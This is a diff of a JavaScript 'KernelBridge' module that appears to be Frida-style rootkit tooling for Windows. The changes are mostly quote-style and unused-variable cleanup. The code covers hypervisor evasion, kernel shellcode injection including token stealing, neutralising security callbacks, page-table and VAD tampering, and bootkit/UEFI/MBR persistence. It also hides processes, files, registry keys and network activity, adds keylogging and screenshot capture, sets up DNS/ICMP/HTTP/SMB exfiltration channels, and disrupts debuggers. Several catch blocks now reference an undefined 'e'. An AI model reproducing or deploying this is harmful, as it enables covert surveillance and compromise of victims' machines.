-                    { msr: 0x40000000, name: "HYPERVISOR_VERSION" },
-                    { msr: 0x40000001, name: "HYPERVISOR_INTERFACE" }
+                    { msr: 0x174, name: 'SYSENTER_CS' },
+                    { msr: 0x175, name: 'SYSENTER_ESP' },
+                    { msr: 0x176, name: 'SYSENTER_EIP' },
+                    { msr: 0x40000000, name: 'HYPERVISOR_VERSION' },
+                    { msr: 0x40000001, name: 'HYPERVISOR_INTERFACE' }
                 ];
 
                 hypervisorMSRs.forEach(function(msrInfo) {
@@ -1521,17 +1514,17 @@ const KernelBridge = {
                         if (originalValue !== null) {
                             var spoofedValue = self.generateSpoofedMSRValue(msrInfo.msr, originalValue);
                             self.writeMSR(msrInfo.msr, spoofedValue);
-                            
+
                             send({
-                                type: "evasion",
-                                target: "kernel_bridge",
-                                action: "msr_spoofed",
+                                type: 'evasion',
+                                target: 'kernel_bridge',
+                                action: 'msr_spoofed',
                                 msr: msrInfo.name,
                                 original: originalValue,
                                 spoofed: spoofedValue
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.hypervisorEvasion.evasionMethods.msrManipulation = true;
@@ -1541,14 +1534,14 @@ const KernelBridge = {
             this.setupHypercallInterception = function() {
                 // Intercept common hypercalls
                 var commonHypercalls = [0x0001, 0x0002, 0x0008, 0x000C, 0x0012]; // VMware hypercalls
-                
+
                 commonHypercalls.forEach(function(hypercallNum) {
                     var interceptor = self.createHypercallInterceptor(hypercallNum);
                     if (self.installHypercallHook(hypercallNum, interceptor)) {
                         send({
-                            type: "evasion",
-                            target: "kernel_bridge",
-                            action: "hypercall_intercepted",
+                            type: 'evasion',
+                            target: 'kernel_bridge',
+                            action: 'hypercall_intercepted',
                             hypercall: hypercallNum
                         });
                     }
@@ -1559,7 +1552,7 @@ const KernelBridge = {
 
             // Detect hypervisors first
             this.hypervisorEvasion.detectedHypervisors = this.detectAdvancedHypervisors();
-            
+
             // Set up evasion methods
             this.setupCPUIDSpoofing();
             this.setupTimingAttackEvasion();
@@ -1568,20 +1561,20 @@ const KernelBridge = {
             this.setupHypercallInterception();
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "hypervisor_evasion_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'hypervisor_evasion_complete',
                 detected_hypervisors: this.hypervisorEvasion.detectedHypervisors.length,
                 active_evasions: Object.keys(this.hypervisorEvasion.evasionMethods).filter(function(method) {
                     return self.hypervisorEvasion.evasionMethods[method];
                 }).length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "hypervisor_evasion_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'hypervisor_evasion_failed',
                 error: e.message
             });
         }
@@ -1591,9 +1584,9 @@ const KernelBridge = {
     initializeKernelCodeInjection: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_kernel_code_injection"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_kernel_code_injection'
         });
 
         try {
@@ -1617,7 +1610,7 @@ const KernelBridge = {
                 injectionPoints.forEach(function(point) {
                     // Create atomic shellcode
                     var shellcode = self.createAtomicShellcode(point.type);
-                    
+
                     // Inject using single instruction replacement
                     var originalBytes = self.readKernelMemory(point.address, shellcode.length);
                     self.writeKernelMemory(point.address, shellcode);
@@ -1626,7 +1619,7 @@ const KernelBridge = {
                         address: point.address,
                         original: originalBytes,
                         injected: shellcode,
-                        type: "atomic"
+                        type: 'atomic'
                     });
                 });
 
@@ -1645,16 +1638,15 @@ const KernelBridge = {
                     var entryPoint = self.getDriverEntryPoint(driver);
                     if (entryPoint) {
                         // Create hook at driver entry point
-                        var hookShellcode = self.createDriverEntryHook(driver.name);
                         var originalEntry = self.readKernelMemory(entryPoint, 16);
-                        
+
                         // Install hook
-                        self.installInlineHook(entryPoint, "DriverEntry_" + driver.name);
-                        
+                        self.installInlineHook(entryPoint, 'DriverEntry_' + driver.name);
+
                         self.kernelCodeInjection.injectedCode.push({
                             address: entryPoint,
                             original: originalEntry,
-                            type: "driver_entry",
+                            type: 'driver_entry',
                             driver: driver.name
                         });
                     }
@@ -1676,12 +1668,12 @@ const KernelBridge = {
                     var ssdtEntry = (syscallAddress.sub(self.ssdtAddress).toInt32() << 4);
                     self.writeKernelMemory(self.ssdtAddress.add(emptySyscallSlot * 4), ssdtEntry);
 
-                    self.kernelCodeInjection.payloads["custom_syscall"] = {
+                    self.kernelCodeInjection.payloads['custom_syscall'] = {
                         address: syscallAddress,
                         ssdt_index: emptySyscallSlot,
                         active: true
                     };
-                    
+
                     self.kernelCodeInjection.injectionMethods.systemCallInjection = true;
                 }
             };
@@ -1700,7 +1692,7 @@ const KernelBridge = {
 
                     // Queue APC
                     if (self.queueKernelAPC(process.eprocess, apcAddress)) {
-                        self.kernelCodeInjection.payloads["apc_" + process.pid] = {
+                        self.kernelCodeInjection.payloads['apc_' + process.pid] = {
                             address: apcAddress,
                             process: process.pid,
                             queued: true
@@ -1721,12 +1713,12 @@ const KernelBridge = {
 
                 // Queue DPC
                 if (self.queueKernelDPC(dpcAddress)) {
-                    self.kernelCodeInjection.payloads["kernel_dpc"] = {
+                    self.kernelCodeInjection.payloads['kernel_dpc'] = {
                         address: dpcAddress,
                         queued: true,
                         active: true
                     };
-                    
+
                     self.kernelCodeInjection.injectionMethods.dpcInjection = true;
                 }
             };
@@ -1734,19 +1726,19 @@ const KernelBridge = {
             // Advanced shellcode creation
             this.createAdvancedShellcodes = function() {
                 // Token stealing shellcode
-                self.kernelCodeInjection.shellcodes["token_steal"] = self.createTokenStealShellcode();
-                
+                self.kernelCodeInjection.shellcodes['token_steal'] = self.createTokenStealShellcode();
+
                 // Callback removal shellcode
-                self.kernelCodeInjection.shellcodes["callback_remove"] = self.createCallbackRemovalShellcode();
-                
+                self.kernelCodeInjection.shellcodes['callback_remove'] = self.createCallbackRemovalShellcode();
+
                 // SSDT restoration shellcode
-                self.kernelCodeInjection.shellcodes["ssdt_restore"] = self.createSSDTRestorationShellcode();
-                
+                self.kernelCodeInjection.shellcodes['ssdt_restore'] = self.createSSDTRestorationShellcode();
+
                 // Process hiding shellcode
-                self.kernelCodeInjection.shellcodes["process_hide"] = self.createProcessHidingShellcode();
-                
+                self.kernelCodeInjection.shellcodes['process_hide'] = self.createProcessHidingShellcode();
+
                 // Registry manipulation shellcode
-                self.kernelCodeInjection.shellcodes["registry_manip"] = self.createRegistryManipulationShellcode();
+                self.kernelCodeInjection.shellcodes['registry_manip'] = self.createRegistryManipulationShellcode();
             };
 
             // Execute all injection methods
@@ -1758,19 +1750,19 @@ const KernelBridge = {
             this.createAdvancedShellcodes();
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "kernel_code_injection_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'kernel_code_injection_complete',
                 injected_code_count: this.kernelCodeInjection.injectedCode.length,
                 active_payloads: Object.keys(this.kernelCodeInjection.payloads).length,
                 shellcodes_created: Object.keys(this.kernelCodeInjection.shellcodes).length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "kernel_code_injection_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'kernel_code_injection_failed',
                 error: e.message
             });
         }
@@ -1780,9 +1772,9 @@ const KernelBridge = {
     setupAdvancedCallbackEvasion: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "setting_up_advanced_callback_evasion"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'setting_up_advanced_callback_evasion'
         });
 
         try {
@@ -1817,8 +1809,8 @@ const KernelBridge = {
                             });
 
                             // Create neutralization hook
-                            var neutralizer = self.createCallbackNeutralizer("process", callback);
-                            self.installInlineHook(callback, "ProcessCallback_" + i);
+
+                            self.installInlineHook(callback, 'ProcessCallback_' + i);
                         }
                     }
                 }
@@ -1828,12 +1820,12 @@ const KernelBridge = {
                 extendedCallbacks.forEach(function(callback) {
                     self.callbackEvasion.processCallbacks.push({
                         address: callback,
-                        type: "extended",
+                        type: 'extended',
                         neutralized: false
                     });
-                    
-                    var neutralizer = self.createCallbackNeutralizer("process_extended", callback);
-                    self.installInlineHook(callback, "ExtendedProcessCallback");
+
+
+                    self.installInlineHook(callback, 'ExtendedProcessCallback');
                 });
             };
 
@@ -1853,8 +1845,8 @@ const KernelBridge = {
                             });
 
                             // Neutralize callback
-                            var neutralizer = self.createCallbackNeutralizer("thread", callback);
-                            self.installInlineHook(callback, "ThreadCallback_" + i);
+
+                            self.installInlineHook(callback, 'ThreadCallback_' + i);
                         }
                     }
                 }
@@ -1876,8 +1868,8 @@ const KernelBridge = {
                             });
 
                             // Create bypass for image callbacks
-                            var bypass = self.createImageCallbackBypass(callback);
-                            self.installInlineHook(callback, "ImageCallback_" + i);
+
+                            self.installInlineHook(callback, 'ImageCallback_' + i);
                         }
                     }
                 }
@@ -1890,7 +1882,7 @@ const KernelBridge = {
                 if (registryCallbacks) {
                     var currentEntry = registryCallbacks;
                     var count = 0;
-                    
+
                     // Traverse callback list
                     while (currentEntry.toInt32() !== 0 && count < 100) {
                         var callbackBlock = self.readKernelMemory(currentEntry, 8);
@@ -1902,10 +1894,10 @@ const KernelBridge = {
                             });
 
                             // Neutralize registry callback
-                            var neutralizer = self.createCallbackNeutralizer("registry", callbackBlock);
-                            self.installInlineHook(callbackBlock, "RegistryCallback_" + count);
+
+                            self.installInlineHook(callbackBlock, 'RegistryCallback_' + count);
                         }
-                        
+
                         currentEntry = self.readKernelMemory(currentEntry, 8); // Next entry
                         count++;
                     }
@@ -1917,7 +1909,7 @@ const KernelBridge = {
                 // Find object manager callbacks
                 var objectCallbacks = self.findObCallbackListHead();
                 if (objectCallbacks) {
-                    var callbackTypes = ["Process", "Thread", "Desktop", "File"];
+                    var callbackTypes = ['Process', 'Thread', 'Desktop', 'File'];
                     callbackTypes.forEach(function(type) {
                         var typeCallbacks = self.findObjectTypeCallbacks(type);
                         typeCallbacks.forEach(function(callback) {
@@ -1928,8 +1920,8 @@ const KernelBridge = {
                             });
 
                             // Create object callback bypass
-                            var bypass = self.createObjectCallbackBypass(callback, type);
-                            self.installInlineHook(callback, type + "ObjectCallback");
+
+                            self.installInlineHook(callback, type + 'ObjectCallback');
                         });
                     });
                 }
@@ -1946,8 +1938,8 @@ const KernelBridge = {
                     });
 
                     // Neutralize bug check callback
-                    var neutralizer = self.createCallbackNeutralizer("bugcheck", callback);
-                    self.installInlineHook(callback, "BugCheckCallback");
+
+                    self.installInlineHook(callback, 'BugCheckCallback');
                 });
             };
 
@@ -1985,9 +1977,9 @@ const KernelBridge = {
                                this.callbackEvasion.bugCheckCallbacks.length;
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "advanced_callback_evasion_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'advanced_callback_evasion_complete',
                 total_callbacks_processed: totalCallbacks,
                 process_callbacks: this.callbackEvasion.processCallbacks.length,
                 thread_callbacks: this.callbackEvasion.threadCallbacks.length,
@@ -1996,11 +1988,11 @@ const KernelBridge = {
                 object_callbacks: this.callbackEvasion.objectCallbacks.length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "advanced_callback_evasion_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'advanced_callback_evasion_failed',
                 error: e.message
             });
         }
@@ -2010,9 +2002,9 @@ const KernelBridge = {
     initializeKernelMemoryManipulation: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_kernel_memory_manipulation"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_kernel_memory_manipulation'
         });
 
         try {
@@ -2041,16 +2033,16 @@ const KernelBridge = {
                 var physMemDevice = self.findPhysicalMemoryDevice();
                 if (physMemDevice) {
                     self.kernelMemoryManipulation.memoryRegions.systemSpace = physMemDevice;
-                    
+
                     // Create physical memory mapping
                     var physicalMapping = self.createPhysicalMemoryMapping();
                     if (physicalMapping) {
                         self.kernelMemoryManipulation.manipulationTechniques.physicalMemoryAccess = true;
-                        
+
                         send({
-                            type: "memory_access",
-                            target: "kernel_bridge",
-                            action: "physical_memory_access_established"
+                            type: 'memory_access',
+                            target: 'kernel_bridge',
+                            action: 'physical_memory_access_established'
                         });
                     }
                 }
@@ -2060,9 +2052,9 @@ const KernelBridge = {
             this.setupPTEManipulation = function() {
                 // Find important pages to manipulate
                 var targetPages = [
-                    { name: "SSDT", address: self.ssdtAddress },
-                    { name: "HAL", address: self.getKernelModuleBase("hal.dll") },
-                    { name: "NTOSKRNL", address: self.ntoskrnlBase }
+                    { name: 'SSDT', address: self.ssdtAddress },
+                    { name: 'HAL', address: self.getKernelModuleBase('hal.dll') },
+                    { name: 'NTOSKRNL', address: self.ntoskrnlBase }
                 ];
 
                 targetPages.forEach(function(page) {
@@ -2074,7 +2066,7 @@ const KernelBridge = {
                             var originalPTE = self.readKernelMemory(pte, 8).readU64();
                             var modifiedPTE = originalPTE | 0x2; // Set write bit
                             self.writeKernelMemory(pte, modifiedPTE);
-                            
+
                             self.kernelMemoryManipulation.allocatedMemory.push({
                                 name: page.name,
                                 address: page.address,
@@ -2101,18 +2093,18 @@ const KernelBridge = {
                             // Hide specific memory regions
                             var startAddress = self.readKernelMemory(vadNode.add(0x18), 8);
                             var endAddress = self.readKernelMemory(vadNode.add(0x20), 8);
-                            
+
                             // Check if this is our allocated memory
                             var isOurMemory = self.kernelMemoryManipulation.allocatedMemory.some(function(alloc) {
                                 return startAddress <= alloc.address && alloc.address <= endAddress;
                             });
-                            
+
                             if (isOurMemory) {
                                 // Modify VAD flags to hide memory
                                 var vadFlags = self.readKernelMemory(vadNode.add(0x30), 4).readU32();
                                 vadFlags |= 0x800000; // Set hidden flag
                                 self.writeKernelMemory(vadNode.add(0x30), vadFlags);
-                                
+
                                 self.kernelMemoryManipulation.hiddenAllocations.push({
                                     vadNode: vadNode,
                                     startAddress: startAddress,
@@ -2121,7 +2113,7 @@ const KernelBridge = {
                                 });
                             }
                         });
-                        
+
                         self.kernelMemoryManipulation.manipulationTechniques.vadTreeModification = true;
                     }
                 }
@@ -2132,16 +2124,16 @@ const KernelBridge = {
                 // Find pool allocations with our tags
                 var poolRegions = self.scanPoolAllocations();
                 var spoofedCount = 0;
-                
+
                 poolRegions.forEach(function(pool) {
                     if (self.isOurPoolAllocation(pool)) {
                         // Change pool tag to something innocuous
                         var originalTag = self.readKernelMemory(pool.address.sub(8), 4).readU32();
                         var spoofedTag = 0x656C6946; // 'File'
                         self.writeKernelMemory(pool.address.sub(8), spoofedTag);
-                        
+
                         self.kernelMemoryManipulation.allocatedMemory.push({
-                            type: "pool",
+                            type: 'pool',
                             address: pool.address,
                             originalTag: originalTag,
                             spoofedTag: spoofedTag,
@@ -2150,7 +2142,7 @@ const KernelBridge = {
                         spoofedCount++;
                     }
                 });
-                
+
                 self.kernelMemoryManipulation.manipulationTechniques.poolTagSpoofing = spoofedCount > 0;
             };
 
@@ -2164,13 +2156,13 @@ const KernelBridge = {
                         // Disable compression for our allocations
                         self.disableCompressionForRegion(structure);
                     });
-                    
+
                     self.kernelMemoryManipulation.manipulationTechniques.memoryCompression = true;
-                    
+
                     send({
-                        type: "memory_manipulation",
-                        target: "kernel_bridge",
-                        action: "memory_compression_bypassed"
+                        type: 'memory_manipulation',
+                        target: 'kernel_bridge',
+                        action: 'memory_compression_bypassed'
                     });
                 }
             };
@@ -2185,7 +2177,7 @@ const KernelBridge = {
                         // Install stack-based hooks
                         var stackHook = self.createKernelStackHook();
                         self.installStackHook(kernelStack, stackHook);
-                        
+
                         self.kernelMemoryManipulation.memoryRegions.kernelStacks.push({
                             process: process,
                             stack: kernelStack,
@@ -2202,8 +2194,8 @@ const KernelBridge = {
                     if (allocation.address) {
                         // Apply XOR obfuscation
                         var obfuscationKey = self.generateObfuscationKey();
-                        var obfuscatedData = self.obfuscateMemoryRegion(allocation.address, allocation.size, obfuscationKey);
-                        
+                        self.obfuscateMemoryRegion(allocation.address, allocation.size, obfuscationKey);
+
                         allocation.obfuscated = true;
                         allocation.obfuscationKey = obfuscationKey;
                     }
@@ -2220,9 +2212,9 @@ const KernelBridge = {
             this.setupMemoryPatternObfuscation();
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "kernel_memory_manipulation_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'kernel_memory_manipulation_complete',
                 allocated_memory_regions: this.kernelMemoryManipulation.allocatedMemory.length,
                 hidden_allocations: this.kernelMemoryManipulation.hiddenAllocations.length,
                 kernel_stacks_hooked: this.kernelMemoryManipulation.memoryRegions.kernelStacks.length,
@@ -2231,11 +2223,11 @@ const KernelBridge = {
                 }).length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "kernel_memory_manipulation_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'kernel_memory_manipulation_failed',
                 error: e.message
             });
         }
@@ -2245,9 +2237,9 @@ const KernelBridge = {
     setupAdvancedRootkitCapabilities: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "setting_up_advanced_rootkit_capabilities"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'setting_up_advanced_rootkit_capabilities'
         });
 
         try {
@@ -2280,10 +2272,10 @@ const KernelBridge = {
             this.setupBootPersistence = function() {
                 // Multiple boot persistence methods
                 var persistenceMethods = [
-                    { name: "bootkit", setup: self.setupBootkit },
-                    { name: "uefi_rootkit", setup: self.setupUEFIRootkit },
-                    { name: "mbr_hook", setup: self.setupMBRHook },
-                    { name: "winload_hook", setup: self.setupWinloadHook }
+                    { name: 'bootkit', setup: self.setupBootkit },
+                    { name: 'uefi_rootkit', setup: self.setupUEFIRootkit },
+                    { name: 'mbr_hook', setup: self.setupMBRHook },
+                    { name: 'winload_hook', setup: self.setupWinloadHook }
                 ];
 
                 var successCount = 0;
@@ -2292,13 +2284,13 @@ const KernelBridge = {
                         if (method.setup()) {
                             successCount++;
                             send({
-                                type: "persistence",
-                                target: "kernel_bridge",
-                                action: "boot_persistence_established",
+                                type: 'persistence',
+                                target: 'kernel_bridge',
+                                action: 'boot_persistence_established',
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.advancedRootkit.persistence.bootPersistence = successCount > 0;
@@ -2308,10 +2300,10 @@ const KernelBridge = {
             this.setupProcessHiding = function() {
                 // Multiple process hiding techniques
                 var hidingTechniques = [
-                    { name: "eprocess_unlink", method: self.unlinkEPROCESS },
-                    { name: "csrss_hide", method: self.hideFromCSRSS },
-                    { name: "peb_manipulation", method: self.manipulatePEB },
-                    { name: "handle_table_hide", method: self.hideFromHandleTable }
+                    { name: 'eprocess_unlink', method: self.unlinkEPROCESS },
+                    { name: 'csrss_hide', method: self.hideFromCSRSS },
+                    { name: 'peb_manipulation', method: self.manipulatePEB },
+                    { name: 'handle_table_hide', method: self.hideFromHandleTable }
                 ];
 
                 // Get current process to hide
@@ -2327,9 +2319,9 @@ const KernelBridge = {
                                     hidden: true
                                 });
                             }
-                        } catch(e) {}
+                        } catch {}
                     });
-                    
+
                     self.advancedRootkit.stealth.processHiding = self.advancedRootkit.hiddenProcesses.length > 0;
                 }
             };
@@ -2337,7 +2329,7 @@ const KernelBridge = {
             // Advanced file system hiding
             this.setupFileSystemHiding = function() {
                 // Hook file system drivers
-                var fsDrivers = ["ntfs.sys", "fastfat.sys", "refs.sys"];
+                var fsDrivers = ['ntfs.sys', 'fastfat.sys', 'refs.sys'];
                 fsDrivers.forEach(function(driverName) {
                     var driver = self.findDriverByName(driverName);
                     if (driver) {
@@ -2346,7 +2338,7 @@ const KernelBridge = {
                         if (originalDispatch) {
                             var hidingHook = self.createFileHidingHook(originalDispatch);
                             self.setDriverDispatchRoutine(driver, 0x0C, hidingHook);
-                            
+
                             self.advancedRootkit.hiddenFiles.push({
                                 driver: driverName,
                                 originalDispatch: originalDispatch,
@@ -2363,10 +2355,10 @@ const KernelBridge = {
             this.setupRegistryHiding = function() {
                 // Hook registry operations
                 var registryRoutines = [
-                    { name: "NtEnumerateKey", syscall: 0x0F },
-                    { name: "NtQueryKey", syscall: 0x15 },
-                    { name: "NtEnumerateValueKey", syscall: 0x13 },
-                    { name: "NtQueryValueKey", syscall: 0x17 }
+                    { name: 'NtEnumerateKey', syscall: 0x0F },
+                    { name: 'NtQueryKey', syscall: 0x15 },
+                    { name: 'NtEnumerateValueKey', syscall: 0x13 },
+                    { name: 'NtQueryValueKey', syscall: 0x17 }
                 ];
 
                 registryRoutines.forEach(function(routine) {
@@ -2385,11 +2377,10 @@ const KernelBridge = {
             // Advanced network hiding
             this.setupNetworkHiding = function() {
                 // Hook network-related APIs
-                var networkDrivers = ["tcpip.sys", "afd.sys", "netio.sys"];
+                var networkDrivers = ['tcpip.sys', 'afd.sys', 'netio.sys'];
                 networkDrivers.forEach(function(driverName) {
                     var driver = self.findDriverByName(driverName);
                     if (driver) {
-                        var dispatchRoutines = self.getDriverDispatchTable(driver);
                         // Hook relevant IRP handlers
                         var networkHook = self.createNetworkHidingHook(driver);
                         self.installNetworkHook(driver, networkHook);
@@ -2397,14 +2388,13 @@ const KernelBridge = {
                 });
 
                 // Hook NDIS (Network Driver Interface Specification)
-                var ndisBase = self.getKernelModuleBase("ndis.sys");
+                var ndisBase = self.getKernelModuleBase('ndis.sys');
                 if (ndisBase) {
-                    var ndisRoutines = ["NdisOpenAdapterEx", "NdisSendNetBufferLists"];
+                    var ndisRoutines = ['NdisOpenAdapterEx', 'NdisSendNetBufferLists'];
                     ndisRoutines.forEach(function(routine) {
                         var routineAddr = self.getKernelExport(routine);
                         if (routineAddr) {
-                            var ndisHook = self.createNDISHook(routine);
-                            self.installInlineHook(routineAddr, routine + "_NetworkHide");
+                            self.installInlineHook(routineAddr, routine + '_NetworkHide');
                         }
                     });
                 }
@@ -2415,23 +2405,21 @@ const KernelBridge = {
             // Advanced keylogging capability
             this.setupKeylogging = function() {
                 // Hook keyboard input
-                var keyboardHook = self.createKeyboardHook();
-                
+
                 // Hook at multiple levels
                 var keyboardTargets = [
-                    { name: "win32k!NtUserGetMessage", hook: self.createUserModeKeyHook },
-                    { name: "i8042prt!I8042KeyboardInterruptService", hook: self.createKernelKeyHook },
-                    { name: "kbdclass!KeyboardClassServiceCallback", hook: self.createClassKeyHook }
+                    { name: 'win32k!NtUserGetMessage', hook: self.createUserModeKeyHook },
+                    { name: 'i8042prt!I8042KeyboardInterruptService', hook: self.createKernelKeyHook },
+                    { name: 'kbdclass!KeyboardClassServiceCallback', hook: self.createClassKeyHook }
                 ];
 
                 keyboardTargets.forEach(function(target) {
                     try {
                         var targetAddr = self.resolveSystemAddress(target.name);
                         if (targetAddr) {
-                            var hook = target.hook();
-                            self.installInlineHook(targetAddr, target.name + "_Keylog");
+                            self.installInlineHook(targetAddr, target.name + '_Keylog');
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.advancedRootkit.capabilities.keylogging = true;
@@ -2441,19 +2429,18 @@ const KernelBridge = {
             this.setupScreenshotCapture = function() {
                 // Hook graphics subsystem
                 var graphicsTargets = [
-                    { name: "win32k!NtGdiStretchBlt", hook: self.createGDIHook },
-                    { name: "dxgkrnl!DxgkSubmitCommand", hook: self.createDXGHook },
-                    { name: "win32k!GreBitBlt", hook: self.createBitBltHook }
+                    { name: 'win32k!NtGdiStretchBlt', hook: self.createGDIHook },
+                    { name: 'dxgkrnl!DxgkSubmitCommand', hook: self.createDXGHook },
+                    { name: 'win32k!GreBitBlt', hook: self.createBitBltHook }
                 ];
 
                 graphicsTargets.forEach(function(target) {
                     try {
                         var targetAddr = self.resolveSystemAddress(target.name);
                         if (targetAddr) {
-                            var hook = target.hook();
-                            self.installInlineHook(targetAddr, target.name + "_Screenshot");
+                            self.installInlineHook(targetAddr, target.name + '_Screenshot');
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.advancedRootkit.capabilities.screenshotCapture = true;
@@ -2463,10 +2450,10 @@ const KernelBridge = {
             this.setupDataExfiltration = function() {
                 // Create covert communication channels
                 var exfiltrationChannels = [
-                    { name: "dns_tunnel", setup: self.setupDNSTunnel },
-                    { name: "icmp_tunnel", setup: self.setupICMPTunnel },
-                    { name: "http_beacon", setup: self.setupHTTPBeacon },
-                    { name: "smb_beacon", setup: self.setupSMBBeacon }
+                    { name: 'dns_tunnel', setup: self.setupDNSTunnel },
+                    { name: 'icmp_tunnel', setup: self.setupICMPTunnel },
+                    { name: 'http_beacon', setup: self.setupHTTPBeacon },
+                    { name: 'smb_beacon', setup: self.setupSMBBeacon }
                 ];
 
                 var activeChannels = 0;
@@ -2475,13 +2462,13 @@ const KernelBridge = {
                         if (channel.setup()) {
                             activeChannels++;
                             send({
-                                type: "exfiltration",
-                                target: "kernel_bridge",
-                                action: "communication_channel_established",
+                                type: 'exfiltration',
+                                target: 'kernel_bridge',
+                                action: 'communication_channel_established',
                                 channel: channel.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.advancedRootkit.capabilities.dataExfiltration = activeChannels > 0;
@@ -2510,9 +2497,9 @@ const KernelBridge = {
             }).length;
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "advanced_rootkit_capabilities_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'advanced_rootkit_capabilities_complete',
                 persistence_methods: activePersistence,
                 stealth_techniques: activeStealth,
                 capabilities: activeCapabilities,
@@ -2520,11 +2507,11 @@ const KernelBridge = {
                 hidden_files: this.advancedRootkit.hiddenFiles.length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "advanced_rootkit_capabilities_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'advanced_rootkit_capabilities_failed',
                 error: e.message
             });
         }
@@ -2534,9 +2521,9 @@ const KernelBridge = {
     initializeKernelDebuggingEvasion: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "initializing_kernel_debugging_evasion"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'initializing_kernel_debugging_evasion'
         });
 
         try {
@@ -2566,9 +2553,9 @@ const KernelBridge = {
                 if (kdDebuggerEnabled) {
                     self.debuggingEvasion.debuggerDetection.kernelDebugger = true;
                     send({
-                        type: "detection",
-                        target: "kernel_bridge",
-                        action: "kernel_debugger_detected"
+                        type: 'detection',
+                        target: 'kernel_bridge',
+                        action: 'kernel_debugger_detected'
                     });
                 }
 
@@ -2578,9 +2565,9 @@ const KernelBridge = {
                     if (self.isProcessBeingDebugged(process)) {
                         self.debuggingEvasion.debuggerDetection.userModeDebugger = true;
                         send({
-                            type: "detection",
-                            target: "kernel_bridge",
-                            action: "usermode_debugger_detected",
+                            type: 'detection',
+                            target: 'kernel_bridge',
+                            action: 'usermode_debugger_detected',
                             process_id: process.pid
                         });
                     }
@@ -2588,21 +2575,21 @@ const KernelBridge = {
 
                 // Detect specific debugging tools
                 var debuggingTools = [
-                    { name: "windbg.exe", detection: "windbgDetected" },
-                    { name: "ida.exe", detection: "ida_detected" },
-                    { name: "ida64.exe", detection: "ida_detected" },
-                    { name: "x32dbg.exe", detection: "x64dbgDetected" },
-                    { name: "x64dbg.exe", detection: "x64dbgDetected" },
-                    { name: "ollydbg.exe", detection: "ollyDetected" }
+                    { name: 'windbg.exe', detection: 'windbgDetected' },
+                    { name: 'ida.exe', detection: 'ida_detected' },
+                    { name: 'ida64.exe', detection: 'ida_detected' },
+                    { name: 'x32dbg.exe', detection: 'x64dbgDetected' },
+                    { name: 'x64dbg.exe', detection: 'x64dbgDetected' },
+                    { name: 'ollydbg.exe', detection: 'ollyDetected' }
                 ];
 
                 debuggingTools.forEach(function(tool) {
                     if (self.isProcessRunning(tool.name)) {
                         self.debuggingEvasion.debuggerDetection[tool.detection] = true;
                         send({
-                            type: "detection",
-                            target: "kernel_bridge",
-                            action: "debugging_tool_detected",
+                            type: 'detection',
+                            target: 'kernel_bridge',
+                            action: 'debugging_tool_detected',
                             tool: tool.name
                         });
                     }
@@ -2616,7 +2603,6 @@ const KernelBridge = {
                     // Overwrite debug interrupt handlers
                     var debugInterrupts = [0x01, 0x03]; // Debug and Breakpoint
                     debugInterrupts.forEach(function(interrupt) {
-                        var originalHandler = self.getInterruptHandler(interrupt);
                         var disruptionHandler = self.createDebugDisruptionHandler(interrupt);
                         self.setInterruptHandler(interrupt, disruptionHandler);
                     });
@@ -2631,23 +2617,23 @@ const KernelBridge = {
 
                 // Disrupt user-mode debuggers
                 var debuggerDisruptionMethods = [
-                    { name: "CloseDebuggerHandles", method: self.closeDebuggerHandles },
-                    { name: "CorruptPEB", method: self.corruptPEBDebugInfo },
-                    { name: "ModifyDebugHeap", method: self.modifyDebugHeap },
-                    { name: "HookDebugAPIs", method: self.hookDebugAPIs }
+                    { name: 'CloseDebuggerHandles', method: self.closeDebuggerHandles },
+                    { name: 'CorruptPEB', method: self.corruptPEBDebugInfo },
+                    { name: 'ModifyDebugHeap', method: self.modifyDebugHeap },
+                    { name: 'HookDebugAPIs', method: self.hookDebugAPIs }
                 ];
 
                 debuggerDisruptionMethods.forEach(function(method) {
                     try {
                         if (method.method()) {
                             send({
-                                type: "disruption",
-                                target: "kernel_bridge",
-                                action: "debugger_disruption_applied",
+                                type: 'disruption',
+                                target: 'kernel_bridge',
+                                action: 'debugger_disruption_applied',
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
